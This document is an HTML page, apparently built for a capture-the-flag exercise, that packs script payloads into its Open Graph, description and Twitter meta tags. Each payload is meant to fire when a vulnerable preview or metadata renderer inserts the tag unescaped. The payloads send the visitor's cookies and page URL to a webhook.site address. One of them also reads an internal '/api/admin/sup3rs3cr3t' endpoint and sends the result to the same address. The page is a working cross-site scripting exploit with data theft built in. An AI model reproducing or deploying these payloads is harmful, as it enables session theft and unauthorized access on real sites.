<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XSS Payload - Max Debug</title>

    <meta property="og:title" content="MAX DEBUG - Critical System Alert">
    
    <!-- PAYLOAD CHÍNH VÀ CHI TIẾT NHẤT SẼ ĐẶT Ở ĐÂY -->
    <meta property="og:description" content="
        <script>
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;

                function sendToWebhook(data, source_tag) {
                    var params = new URLSearchParams();
                    params.append('source_tag', source_tag || 'unknown_source');
                    for (var key in data) {
                        if (data.hasOwnProperty(key)) {
                            let value = data[key];
                            if (typeof value === 'object' && value !== null) {
                                if (value instanceof Error) {
                                    value = { 
                                        error_name: value.name, 
                                        error_message: value.message, 
                                        error_stack: value.stack ? value.stack.substring(0, 500) : 'no_stack', // Giới hạn stack trace
                                        error_string: value.toString() 
                                    };
                                } else if (value instanceof Response) { // Xử lý đối tượng Response
                                    value = {
                                        response_ok: value.ok,
                                        response_status: value.status,
                                        response_statusText: value.statusText,
                                        response_type: value.type,
                                        response_url: value.url
                                    };
                                }
                                params.append(key, JSON.stringify(value));
                            } else {
                                params.append(key, value);
                            }
                        }
                    }
                    var img = new Image();
                    var full_url = attacker_url + '?' + params.toString();
                    // Để debug URL, có thể gửi nó về trước
                    // var pre_img = new Image();
                    // pre_img.src = attacker_url + '?debug_url_length=' + full_url.length + '&debug_url_start=' + encodeURIComponent(full_url.substring(0,100));
                    img.src = full_url;
                }

                try {
                    sendToWebhook({ 
                        stage: 'og_script_start', 
                        current_document_cookie: document.cookie || 'empty',
                        location_href: window.location.href 
                    }, 'og:description');
                    
                    fetch('/api/admin/sup3rs3cr3t', {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest'
                        }
                    })
                    .then(response => {
                        var response_headers_arr = [];
                        try { response_headers_arr = Array.from(response.headers.entries()); } catch(e){}

                        sendToWebhook({ 
                            stage: 'og_fetch_response_received', 
                            response_obj: response, // Gửi cả đối tượng response để hàm sendToWebhook xử lý
                            response_headers_debug: JSON.stringify(response_headers_arr)
                        }, 'og:description');

                        if (!response.ok) {
                            return response.text().then(text => {
                                var errorToThrow = new Error('Fetch failed with status ' + response.status);
                                errorToThrow.isResponseError = true;
                                errorToThrow.status = response.status;
                                errorToThrow.statusText = response.statusText;
                                errorToThrow.responseBody = text.substring(0, 500); // Giới hạn body lỗi
                                errorToThrow.responseHeaders = JSON.stringify(response_headers_arr);
                                throw errorToThrow;
                            });
                        }
                        return response.json();
                    })
                    .then(data => {
                        sendToWebhook({ 
                            stage: 'og_sup3rs3cr3t_success', 
                            flag_data: data 
                        }, 'og:description');
                    })
                    .catch(error => {
                        sendToWebhook({ 
                            stage: 'og_sup3rs3cr3t_fetch_catch_error', 
                            error_caught: error 
                        }, 'og:description');
                    });
                } catch (e) {
                     sendToWebhook({ 
                        stage: 'og_outer_script_error', 
                        outer_error: e
                    }, 'og:description');
                }
            })();
        </script>
    ">

    <meta name="description" content="
        <script>
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;
                var img = new Image();
                var data = {
                    source_tag: 'name:description',
                    status: 'name_description_executed',
                    loc: window.location.href,
                    cookie: document.cookie || 'empty'
                };
                img.src = attacker_url + '?' + new URLSearchParams(data).toString();
            })();
        </script>
    ">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="MAX DEBUG - Twitter">
    <meta name="twitter:description" content="
        <script>
            (function() {
                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
                var webhook_base_url = 'https://webhook.site/';
                var attacker_url = webhook_base_url + webhook_id;
                var img = new Image();
                 var data = {
                    source_tag: 'twitter:description',
                    status: 'twitter_description_executed',
                    loc: window.location.href,
                    cookie: document.cookie || 'empty'
                };
                img.src = attacker_url + '?' + new URLSearchParams(data).toString();
            })();
        </script>
    ">

</head><body>
    <h1>MAX DEBUG XSS Payload Page</h1>
    <p>Check your webhook.</p>
</body></html>
